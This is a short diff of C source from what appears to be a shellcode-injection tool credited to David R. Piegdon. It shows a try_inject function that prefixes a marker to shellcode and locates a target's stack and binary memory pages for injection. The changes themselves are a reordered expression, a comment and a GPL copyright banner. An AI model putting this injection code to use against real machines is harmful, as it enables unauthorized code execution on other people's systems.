@@ -101,13 +101,15 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int inj
 
 	// we attach a self-changing marker to the shellcode. this way we can test,
 	// if the shellcode has been executed, yet.
-	codelen = MARKER_LEN + injectcodelen;
+	codelen = injectcodelen + MARKER_LEN;
 	code = malloc(codelen + 1);
 	memcpy(code, marker, MARKER_LEN);
 	memcpy(code + MARKER_LEN, injectcode, injectcodelen);
 
 	// seek the stack-page with environment and stuff
 	stack_bottom = linear_seek_mapped_page(lin, 0xbffff, 0x1000, -1);
+
+	// now we will inject the code.
 
 	// seek bounds of mapped binary
 	binary_first = linear_seek_mapped_page(lin, 0x08000, 0x1000, 1);
@@ -252,6 +254,13 @@ int main(int argc, char**argv)
 	enum memsource memsource = SOURCE_UNDEFINED;
 	char *filename = NULL;
 	int nodeid = 0;
+
+	fprintf(stderr,
+		"(c) 2006,2007 by losTrace aka ``David R. Piegdon''.\n"
+		"This program is distributed WITHOUT ANY WARRANTY; without even the implied\n"
+		"warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n"
+		"GNU General Public License for more details.\n\n"
+		);
 
 	while( -1 != (c = getopt(argc, argv, "pan:f:b:c:"))) {
 		switch (c) {
